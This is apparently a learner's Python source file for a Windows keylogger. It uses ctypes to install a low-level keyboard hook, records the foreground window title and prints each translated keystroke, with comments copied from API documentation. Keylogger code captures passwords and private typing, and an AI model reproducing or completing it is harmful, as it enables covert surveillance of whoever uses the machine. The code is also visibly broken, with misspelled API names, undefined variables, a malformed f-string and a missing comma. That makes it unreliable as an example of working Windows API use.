'''
a hook is a point in the system message-handling mechanism where an application can install a subroutine
to monitor the message traffic in the system and process certain types of messages before
they reach the target window procedure

hooks can be used to intercept, read, and process keyboard input events
'''

from ctypes import *
from ctypes import wintypes

user32 = windll.user32

LRESULT = c_long

'''
desired hook is WH_KEYBOARD_LL, which installs a hook
procedure that monitors low level keyboard input events
'''

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE, )
GetWindowTextLengthA.restype = wintypes.INT 

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

keyboard_state = wintypes.BYTE * 256 #256 byte array that contains the keyboard state; required for GetKeyboardState
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state), )
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEX
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT

'''
HOOKPROC callback function is an application-defined
or library-defined callback function used with the SetWindowsHookExA function
HOOKPROC defines a POINTER to this callback function
'''

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD) #second arg is HOOKPROC, a pointer to a hook procedure
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
  _fields_ = [("vkCode", wintypes.DWORD), 
              ("scanCode", wintypes.DWORD), 
              ("flags", wintypes.DWORD), 
              ("time", wintypes.DWORD), 
              ("dwExtraInfo", wintypes.ULONG)]

def get_foreground_process(): 
  hwnd = user32.GetForeGroundWindow()
  length = GetWindowTextLengthA(hwnd) #retrieve character length of specified title bar text
  buff = create_string_buffer(length + 1) #copy text of specified window's titlebar into buffer
  GetWindowTextA(hwnd, buff, length + 1)
  return buff.value
  #needs error checking!

def hook_function(nCode, wParam, lParam):
  global last
  if last != get_foreground_process():
    last = get_foreground_process()
    print(f"\n[{last.decode("latin-1")}]")
  
  #check for keypress and store in KBDLLHOOKSTRUCT
  if wParam == WM_KEYDOWN:
    keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

    state = (wintypes.BYTE * 256)()
    GetKeyState(WM_SHIFT)
    GetKeyboardState(byref(state))

    buf = (c_ushort * 1)()
    n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0) #1st param is virtual keycode to be translated, 2nd is the hardware scan code of the key to be translated
    
    #ToAscii returns 0 if no key is pressed, 1 if 1 key is pressed, and 2 if 2 keys are pressed
    if n > 0:
      if keyboard.vkCode == WM_RETURN:
        print()
      else:
        print(f"{string_at(buff).decode("latin-1"), end="", flush=True}")
  
  return CallNextHookEx(nCode, wParam, lParam) #passes hook information to the next hook procedure in the current hook chain. hook procedure can call this function before OR after processing the hook information

callback = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)

#retrieve message fromo calling thread's message queue
#GetMessage function dispatches incoming, sent messages until a posted message is available for retrieval
GetMessageA(byref(wintypes.MSG())0, 0, 0)


#needs interrupt exception!!

